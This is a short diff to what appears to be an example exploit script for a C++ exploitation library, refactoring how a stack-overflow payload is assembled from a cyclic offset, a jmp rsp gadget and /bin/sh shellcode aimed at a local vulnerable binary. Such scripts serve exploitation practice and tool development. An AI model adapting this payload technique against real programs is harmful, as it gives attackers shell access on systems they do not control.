@@ -15,11 +15,10 @@ int main(int argc, char **argv) try {
     auto offset    = cyclic_find(RIP);
     auto shellcode = linux_sh_x64();
 
-    auto payload = from_ranges<uint8_t>(
-        cyclic(offset), 
-        p<uint64_t>(jmp_rsp), 
-        shellcode
-    );
+    std::string payload;
+    payload += cyclic(offset);
+    payload += p<uint64_t>(jmp_rsp);
+    payload += shellcode;
 
     auto vuln = "./bin/vuln";
     auto proc = use_gdb ? Gdb::debug(vuln, "b main\nc\n") : Process(vuln);
